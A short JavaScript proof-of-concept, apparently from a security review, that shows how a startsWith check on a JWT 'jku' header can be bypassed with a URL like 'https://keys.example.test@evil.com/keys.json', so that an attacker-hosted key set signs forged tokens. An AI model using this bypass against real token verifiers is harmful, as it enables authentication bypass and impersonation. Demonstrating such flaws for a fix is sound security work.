// Reproduce src/oauth/token.js flow conceptually
// header.jku is the JWT "jku" header param = attacker-controlled
// verifyExternalToken calls fetchKey(header.jku)
// fetchKey only checks String(url).startsWith("https://keys.example.test")
// which we proved is bypassable -> attacker can host their own JWKS & sign tokens
const fakeHeader = { jku: "https://keys.example.test@evil.com/keys.json" };
console.log("attacker jku:", fakeHeader.jku);
console.log("-> fetchKey would fetch from:", new URL(fakeHeader.jku).hostname);
console.log("-> attacker controls the JWKS, signs any JWT (RS256) with their own key");
console.log("-> verifyJwt accepts it because the key came from the attacker jku");
'
"}

